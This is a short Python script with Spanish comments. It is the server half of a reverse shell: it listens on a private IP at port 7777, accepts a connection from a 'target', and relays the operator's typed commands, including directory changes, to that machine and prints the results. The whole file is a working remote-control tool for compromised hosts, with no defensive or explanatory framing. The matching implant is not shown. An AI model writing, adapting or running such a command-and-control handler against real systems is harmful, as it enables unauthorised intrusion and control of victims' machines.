#!/user/bin/env python
#_*_ coding: utf8 _*_

import socket

def shell():
    current_dir = target.recv(1024)
    while True:
        comando = input("{}~#: ".format(current_dir))        
        if comando == "exit":
            target.send(comando.encode('utf8'))
            break
        elif comando[:2] == "cd":
            target.send(comando.encode('utf8'))
            res = target.recv(1024).decode('utf8')
            current_dir = res
            print(res)
        else:
            target.send(comando.encode('utf8'))
            res = target.recv(30000)
            if res == "1":
                continue
            else:
              print(res)


def upserver():
    global server 
    global ip
    global target 

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ## Ip del equipo y puerto por donde se eschucha  verificar  netstat -an | findstr 7777
    server.bind(('172.16.89.146',7777))
    server.listen(1)

    print ("Corriendo Servidor y Esperando Conexiones....")

    target, ip = server.accept()
    print("Conexion Recibida de:" + str(ip[0]))

upserver()
shell()
server.close()


